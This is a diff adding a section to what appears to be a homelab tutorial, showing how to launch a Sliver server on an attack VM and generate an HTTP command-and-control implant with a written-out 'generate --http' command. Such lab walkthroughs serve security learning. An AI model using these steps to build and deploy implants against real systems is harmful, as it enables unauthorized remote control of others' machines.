@@ -201,3 +201,19 @@ We will be using the coommand prompt on our host machine, may it be Linux, Mac, 
 
 <br>iv. We will now create a directory for future workings
 <br> mkdir -p /opt/sliver
+
+<h2> Generate C2 payload</h2>
+
+i. We will begin a SSH session from into our Attack machine as we did earlier using the command ssh user_name@IP_Address > sudo su ( to drop into the rootshell). We will then drop into the root shell and cd into our dir we made for sliver server and then launch sliver using commands...
+
+<br>cd /opt/sliver
+<br> sliver-server 
+
+<br>![Screenshot (88)](https://github.com/user-attachments/assets/904740c0-4ca3-4a18-974b-d785a6f9628c)
+
+<br>ii. We now will generate a  C2 session payload using are attacks machine static ip address we assigned the VM. Using command below. After the command is compiled it will provide us with a implant of the payload which we will need to confirm. the names for our executables are unique and everyones is different. 
+
+<br> generate --http [Linux_VM_IP] --save /opt/sliver
+
+<br>
+<br>
